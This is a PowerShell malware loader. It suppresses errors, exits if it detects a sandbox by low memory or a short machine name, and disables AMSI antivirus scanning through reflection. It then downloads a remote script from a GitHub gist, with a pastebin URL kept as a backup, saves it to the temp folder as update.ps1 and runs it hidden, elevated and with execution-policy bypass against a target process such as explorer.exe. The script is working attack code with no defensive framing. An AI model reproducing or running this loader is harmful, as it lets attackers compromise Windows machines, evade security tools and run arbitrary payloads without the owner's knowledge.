$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

function Invoke-StealthLoad {
    param([string]$Target = "explorer.exe")

    $u = "https://gist.githubusercontent.com/santaklouse/b0cd38ef346622db4b563ebf51d803d4/raw/d2839e73f3f4f96ddf8132690821b959eb50e6e8/stealth_loader.py"
    
    # $urls = @(
    #     "https://gist.githubusercontent.com/santaklouse/b0cd38ef346622db4b563ebf51d803d4/raw/d2839e73f3f4f96ddf8132690821b959eb50e6e8/stealth_loader.py",
    #     "https://pastebin.com/raw/V05ydb7K"  # backup URL
    # )
    
    # foreach ($u in $urls) {
    try {
        $data = (New-Object Net.WebClient).DownloadString($u)
        if ($data.Length -gt 1000) {
            $tmp = "$env:TEMP\update.ps1"
            $data | Out-File -FilePath $tmp -Encoding UTF8
            
            Write-Host "[+] Payload loaded" -ForegroundColor Green
            Start-Process powershell -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -File `"$tmp`" $Target" -Verb RunAs -WindowStyle Hidden
            return
        }
    } catch {}
    # }
    
    Write-Host "[-] Failed to load payload" -ForegroundColor Red
}

# Anti-Sandbox / Anti-Analysis
if ([System.Environment]::MachineName.Length -lt 6 -or 
    (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB) {
    exit
}

# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Запуск
Invoke-StealthLoad -Target $args[0]